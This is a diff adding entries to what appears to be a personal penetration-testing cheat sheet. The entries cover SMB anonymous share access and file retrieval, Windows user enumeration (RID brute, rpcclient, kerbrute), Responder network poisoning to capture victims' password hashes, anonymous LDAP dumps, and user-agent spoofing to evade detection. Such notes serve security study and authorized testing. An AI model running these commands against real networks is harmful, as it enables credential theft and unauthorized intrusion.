@@ -20,7 +20,7 @@ gobuster dir -u http://(DOMAIN) -w /usr/share/wordlists/dirb/common.txt
 (mask your traffic to impersonate a normal browser by adding a -a flag)
 (and add after it for example "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 
-(if basically zero results, use medium.txt instead of common.txt)
+(if basically zero results, use medium.txt instead of common.txt, but with this file path instead of the one with common.txt: dirbuster/directory-list-2.3-medium.txt)
 
 
 check if targets running an active imap email service
@@ -44,3 +44,61 @@ ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password <USER>@<TARG
 smbclient connect command:
 smbclient //<TARGET_IP>/backups -N
 
+check shared folders over SMB anonymously (without password) command:
+smbclient -L //<TARGET_IP>/ -N
+(use this first to see the list of folders. ignore shares ending in $ as they are admin locked. target the custom ones.)
+
+smbclient share downloader commands:
+(once inside the smb shell with the smb: \> prompt, use these 3 commands)
+ls
+(lists everything in the shared folder to find configuration files or credentials)
+get <FILENAME>
+(downloads the targeted file straight to your machine so you can read it locally)
+exit
+(closes the connection to bring you back to your regular Linux terminal)
+
+search for full path of any binary command:
+which <TOOL_NAME>
+(use this to find the exact location of a tool on a system, like finding /usr/bin/xxd)
+
+find target configuration files based on file extension command:
+find / -type f -name "*.conf" 2>/dev/null
+(searches the entire machine for configuration files while automatically hiding permission denied errors)
+
+count number of specific files on system command:
+find / -type f -name "*.bak" 2>/dev/null | wc -l
+(counts how many backup files exist on the target machine without cluttering the screen)
+
+connect to a remote Microsoft SQL database command:
+mssqlclient.py <USERNAME>@<TARGET_IP> -windows-auth
+(uses the impacket toolkit to open a database terminal. your prompt will change to SQL> if successful.)
+
+dump all windows usernames without a password command:
+[TARGET: Windows (Easy / Legacy) | RUN FROM: Kali Linux]
+crackmapexec smb <TARGET_IP> --rid-brute
+(uses RID cycling to force a legacy windows server to reveal every local user account name)
+
+alternative username discovery command (rpcclient):
+[TARGET: Windows (Easy / Legacy) | RUN FROM: Kali Linux]
+rpcclient -U "" -N <TARGET_IP>
+(connects quietly using old school RPC. if it drops you into a prompt, type 'enumdomusers' to print all system account names)
+
+connect to a remote Microsoft SQL database command:
+[TARGET: Windows (SQL Servers) | RUN FROM: Kali Linux]
+mssqlclient.py <USERNAME>@<TARGET_IP> -windows-auth
+(uses the impacket toolkit to open a database terminal. your prompt will change to SQL> if successful.)
+
+modern kerberos username enumeration command (kerbrute):
+[TARGET: Windows Active Directory (Modern Real-World) | RUN FROM: Kali Linux]
+kerbrute userenum -d <DOMAIN> --dc <TARGET_IP> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+(talks straight to port 88. checks if usernames exist instantly without triggering account lockouts or generating noisy logs)
+
+modern passive network poisoning command (responder):
+[TARGET: Windows Networks (Modern Real-World) | RUN FROM: Kali Linux]
+sudo responder -I <INTERFACE_NAME> -dwV
+(listens to the local network for windows connection errors, poisons the request, and forces victims to hand over their password hashes)
+
+modern unauthenticated directory lookup command (ldapsearch):
+[TARGET: Windows Active Directory (Modern Real-World) | RUN FROM: Kali Linux]
+ldapsearch -x -H ldap://<TARGET_IP> -b "DC=<DOMAIN>,DC=<EXTENSION>"
+(attempts an anonymous bind to dump the entire corporate employee registry and user groups over port 389)
